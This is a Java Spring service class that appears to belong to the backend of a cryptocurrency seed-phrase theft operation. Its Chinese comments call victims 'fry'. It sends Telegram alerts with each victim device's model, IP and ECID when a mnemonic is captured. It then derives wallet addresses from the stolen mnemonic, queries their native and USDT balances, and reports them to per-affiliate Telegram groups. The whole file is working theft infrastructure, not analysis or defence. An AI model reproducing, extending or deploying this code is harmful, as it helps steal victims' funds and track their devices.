package com.consume.service;

import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executor;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import com.consume.dao.Address4Dao;
import com.consume.dao.ChannelDao;
import com.consume.dao.DeviceDao;
import com.consume.entity.ChannelEntity;
import com.consume.entity.DeviceEntity;
import com.consume.util.MessageFormatUtils;
import com.consume.util.TelegramNotificationUtil;
import com.consume.util.WalletBalanceQuery;
import com.consume.util.WalletBalanceQuery.ChainBalance;
import com.consume.util.WalletDerivator;

import lombok.extern.slf4j.Slf4j;

/**
 * 助记词 / 余额飞机通知（异步 + 并发限流）。
 */
@Service
@Slf4j
public class MnemonicTelegramService {

    private static final DateTimeFormatter DTF = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
    private static final long FISH_DEDUP_MS = 120_000L;

    private final ConcurrentHashMap<String, Long> fishDedup = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<Integer, Boolean> balanceDedup = new ConcurrentHashMap<>();

    @Autowired
    private TelegramNotificationUtil telegramNotificationUtil;
    @Autowired
    private ChannelDao channelDao;
    @Autowired
    private DeviceDao deviceDao;
    @Autowired
    private Address4Dao address4Dao;
    @Autowired
    private WalletBalanceQuery walletBalanceQuery;
    @Autowired
    @Qualifier("balanceNotifyExecutor")
    private Executor balanceNotifyExecutor;

    @Async("telegramMsgExecutor")
    public void notifyFishAsync(Integer deviceRowId, String deviceId, String channelCodeFallback, String clientIpFallback) {
        try {
            DeviceEntity device = loadDevice(deviceRowId, deviceId);
            if (device == null) {
                log.info("正常日志:[telegram] 设备不存在，跳过新鱼苗通知 deviceRowId={} deviceId={}",
                        deviceRowId, deviceId);
                return;
            }
            String dedupKey = firstNonEmpty(device.getDeviceId(), String.valueOf(device.getId()));
            long nowMs = System.currentTimeMillis();
            Long prev = fishDedup.putIfAbsent(dedupKey, nowMs);
            if (prev != null && nowMs - prev < FISH_DEDUP_MS) {
                log.info("正常日志:[telegram] 新鱼苗去重跳过 device={}", dedupKey);
                return;
            }
            if (prev != null) fishDedup.put(dedupKey, nowMs);
            pruneDedup(fishDedup, nowMs, FISH_DEDUP_MS);

            String channelCode = firstNonEmpty(device.getChannelCode(), channelCodeFallback);
            ChannelEntity channel = resolveChannel(channelCode);
            if (channel == null) {
                log.info("正常日志:[telegram] 渠道无 telegram_groupid，跳过 device={} channel={}",
                        device.getDeviceId(), channelCode);
                return;
            }
            String groupId = channel.getTelegramGroupid();
            String datetime = LocalDateTime.now(ZoneId.systemDefault()).format(DTF);
            String text = MessageFormatUtils.saveMnemonicFishTelegram(
                    groupId,
                    channelCode,
                    channel.getName(),
                    device.getModel(),
                    firstNonEmpty(device.getIp(), clientIpFallback),
                    firstNonEmpty(device.getEcid(), device.getDeviceId()),
                    datetime);
            telegramNotificationUtil.sendTelegramMsg(text, groupId);
        } catch (Exception e) {
            log.info("异常日志:[telegram] 新鱼苗通知失败 deviceRowId={} deviceId={} err={}",
                    deviceRowId, deviceId, e.getMessage());
        }
    }

    /**
     * 派生成功后异步：查余额 → 回写 → 飞机余额消息。
     * 投递到 balanceNotifyExecutor，与 Kafka / addaddress 监听池隔离。
     */
    public void notifyBalanceAfterDeriveAsync(Integer mnemonicId, Integer deviceRowId, String deviceId,
                                              String channelCodeFallback, String clientIpFallback,
                                              List<WalletDerivator.DerivedAddress> derived) {
        if (mnemonicId == null || derived == null || derived.isEmpty()) return;
        List<WalletDerivator.DerivedAddress> copied = new ArrayList<>(derived);
        balanceNotifyExecutor.execute(() -> {
            try {
                doBalanceNotify(mnemonicId, deviceRowId, deviceId, channelCodeFallback, clientIpFallback, copied);
            } catch (Exception e) {
                log.info("异常日志:[telegram] 余额通知失败 mnemonicId={} err={}", mnemonicId, e.getMessage());
                balanceDedup.remove(mnemonicId);
            }
        });
    }

    private void doBalanceNotify(Integer mnemonicId, Integer deviceRowId, String deviceId,
                                 String channelCodeFallback, String clientIpFallback,
                                 List<WalletDerivator.DerivedAddress> derived) {
        if (balanceDedup.putIfAbsent(mnemonicId, Boolean.TRUE) != null) {
            log.info("正常日志:[telegram] 余额通知去重跳过 mnemonicId={}", mnemonicId);
            return;
        }
        Map<String, String> chainAddr = new HashMap<>();
        for (WalletDerivator.DerivedAddress da : derived) {
            if (da == null || da.chaintype == null || da.address == null) continue;
            String c = da.chaintype.toLowerCase();
            chainAddr.putIfAbsent(c, da.address);
        }
        Map<String, ChainBalance> balances = walletBalanceQuery.queryAll(chainAddr);

        double refreshed = System.currentTimeMillis() / 1000.0;
        for (WalletDerivator.DerivedAddress da : derived) {
            if (da == null || da.chaintype == null) continue;
            ChainBalance b = balances.get(da.chaintype.toLowerCase());
            if (b == null) continue;
            try {
                address4Dao.updateBalance(mnemonicId, da.chaintype, da.addrIndex,
                        nzBal(b.getNativeBal()), nzBal(b.getUsdtBal()), "0", refreshed);
            } catch (Exception e) {
                log.info("异常日志:[telegram] 回写余额失败 mnemonicId={} chain={} err={}",
                        mnemonicId, da.chaintype, e.getMessage());
            }
        }

        DeviceEntity device = loadDevice(deviceRowId, deviceId);
        String channelCode = device != null
                ? firstNonEmpty(device.getChannelCode(), channelCodeFallback)
                : channelCodeFallback;
        ChannelEntity channel = resolveChannel(channelCode);
        if (channel == null) {
            log.info("正常日志:[telegram] 渠道无 telegram_groupid，跳过余额 mnemonicId={} channel={}",
                    mnemonicId, channelCode);
            return;
        }
        String groupId = channel.getTelegramGroupid();
        String datetime = LocalDateTime.now(ZoneId.systemDefault()).format(DTF);
        String model = device == null ? null : device.getModel();
        String ip = device == null ? clientIpFallback : firstNonEmpty(device.getIp(), clientIpFallback);
        String ecid = device == null ? deviceId : firstNonEmpty(device.getEcid(), device.getDeviceId());
        String text = MessageFormatUtils.saveBalanceTelegram(
                groupId, channelCode, channel.getName(), mnemonicId,
                model, ip, ecid, datetime, balances);
        telegramNotificationUtil.sendTelegramMsg(text, groupId);
    }

    private DeviceEntity loadDevice(Integer deviceRowId, String deviceId) {
        DeviceEntity device = null;
        if (deviceRowId != null) {
            try { device = deviceDao.findById(deviceRowId); } catch (Exception ignore) {}
        }
        if (device == null && deviceId != null && !deviceId.isEmpty()) {
            try { device = deviceDao.findDeviceId(deviceId); } catch (Exception ignore) {}
        }
        return device;
    }

    private ChannelEntity resolveChannel(String channelCode) {
        if (channelCode == null || channelCode.isEmpty()) return null;
        ChannelEntity channel = channelDao.findByChannelcode(channelCode);
        if (channel == null || channel.getTelegramGroupid() == null
                || channel.getTelegramGroupid().isEmpty()) {
            return null;
        }
        return channel;
    }

    private static void pruneDedup(ConcurrentHashMap<String, Long> map, long now, long ttl) {
        if (map.size() < 500) return;
        map.entrySet().removeIf(e -> now - e.getValue() > ttl);
    }

    private static String firstNonEmpty(String a, String b) {
        if (a != null && !a.isEmpty()) return a;
        return b == null ? "" : b;
    }

    private static String nzBal(String v) {
        return (v == null || v.isEmpty()) ? "0" : v;
    }
}
